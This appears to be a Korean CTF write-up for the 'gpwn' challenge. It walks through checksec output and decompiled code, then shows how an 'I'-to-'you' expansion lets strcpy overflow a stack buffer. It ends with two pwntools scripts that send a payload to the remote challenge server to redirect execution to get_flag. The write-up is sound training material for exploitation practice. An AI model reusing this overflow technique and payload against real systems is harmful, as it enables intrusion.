@@ -1,0 +1,143 @@
+checksec 입력시
+
+CANARY : disabled
+FORTIFY : disabled
+NX : ENABLED
+PIE : disabled
+RELRO : Partial
+
+1. 쉘코드 사용 불가
+
+2. 주소 고정되어 있음
+
+3. got overwrite 사용 가능
+
+이제 바이너리 코드를 보자.
+
+#main.c
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  vuln();
+  return 0;
+}
+
+main 코드인데 vuln() 함수만 있다. vuln 함수 코드를 보자
+
+
+#vuln()
+
+int vuln()
+{
+  int v0; // ST08_4
+  const char *v1; // eax
+  char s; // [esp+1Ch] [ebp-3Ch]
+  char v4; // [esp+3Ch] [ebp-1Ch]
+  char v5; // [esp+40h] [ebp-18h]
+  char v6; // [esp+47h] [ebp-11h]
+  char v7; // [esp+48h] [ebp-10h]
+  char v8; // [esp+4Fh] [ebp-9h]
+
+  printf("Tell me something about yourself: ");
+  fgets(&s, 32, edata);
+  std::string::operator=(&input, &s);
+  std::allocator<char>::allocator(&v6);
+  std::string::string(&v5, "you", &v6);
+  std::allocator<char>::allocator(&v8);
+  std::string::string(&v7, "I", &v8);
+  replace((std::string *)&v4, (std::string *)&input, (std::string *)&v7);
+  std::string::operator=(&input, &v4, v0, &v5);
+  std::string::~string((std::string *)&v4);
+  std::string::~string((std::string *)&v7);
+  std::allocator<char>::~allocator(&v8);
+  std::string::~string((std::string *)&v5);
+  std::allocator<char>::~allocator(&v6);
+  v1 = (const char *)std::string::c_str((std::string *)&input);
+  strcpy(&s, v1);
+  return printf("So, %s\n", &s);
+}
+
+
+@@@@@@@@@@@
+
+내풀이 예상
+
+strcpy 의 취약점 이용
+
+return printf 이므로 printf 의 got 주소를 획득하고
+
+got 주소에 get_flag 주소로 바꾸고 실행시키면 플래그 를 알수있다.
+
+버퍼는 3c 는 60 
+
+SFP 4 RET 4 이므로
+
+버퍼 64 + got 주소 + ret 4버퍼 + get_flag 주소	( 처음생각한 페이로드 )
+
+하지만 버퍼가 64에 비해 fget 이 32까지만 입력할수있으므로 ret 주소를 덮으면서
+BOF 를 일으키는것은 불가능하다.
+
+따라서 다시 페이로드를 생각하면 vuln 이 어떻게 돌아가는지 생각해야할 필요가있다.
+
+코드를 보면 I를 입력했을때 you 로 바뀌는것을 볼수있는데 이를이용해서 fget 의 범위를 지키고
+
+버퍼오버플로우를 일으켜보자.
+
+I를 한번 입력했을떄 you로 바뀌는데 I를 20번 입력한다면 you 가 20번 총 60버퍼가 들어간다.
+
+즉 fget 이나 다른 함수에 취약점이 있는것이 아니라 strcpy 즉 복사 함수에 취약점이 있는것이기 때문에
+이 strcpy 를 이용하여 버퍼오버플로우를 일으키면 된다.
+
+따라서 따로 아무문자열 4버퍼와 I *20번 입력해서 
+
+3c = 60 + SFP(4) = 64 	를 맞춰주면된다.
+
+따라서 
+payload = 'a'*4
+payload += 'I'*20
+
+즉 버퍼로 64 버퍼 맞춰주고 나머지 ret 4버퍼를 맞춰주는것이다.
+
+쯤 될것이다.
+
+그리고 제일 중요한 get_flag의 주소를 확보하고
+
+get_flag : 0x08048f0d
+
+이제 페이로드를 작성해보자.
+
+
+
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz', 3011)
+
+get_flag = p32(0x08048f0d)
+
+payload = "A"*4
+payload += 'I'*20
+payload += get_flag
+
+p.sendline(payload)
+p.interactive()
+
+이렇게 작성이되고 또 주소값을 잘모르겠다. 다르다 등등 힘들다면 함수를 써도 상관없다.
+
+from pwn import *
+
+e = ELF("./gpwn")
+p = remote('ctf.j0n9hyun.xyz', 3011)
+
+get_flag = p32(e.symbols["get_flag"])
+
+payload = 'a'*4
+payload += "I"*20
+payload += get_flag
+
+p.sendline(payload)
+p.interactive()
+
+이러한 식으로 작성해도 상관없다.
+
+
+
